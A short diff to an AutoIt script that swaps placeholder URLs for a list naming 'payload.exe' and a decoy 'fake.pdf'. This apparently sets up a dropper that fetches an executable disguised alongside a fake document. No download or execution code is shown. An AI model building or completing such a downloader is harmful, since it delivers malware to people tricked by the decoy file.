@@ -1,7 +1,7 @@
 #include <StaticConstants.au3>
 #include <WindowsConstants.au3>
 
-Local $urls = "url1,url2"
+Local $urls = "www.site/payload.exe,www.site.com/fake.pdf"
 
 Local $urlsArray = StringSplit($urls, ",", 2 )
 
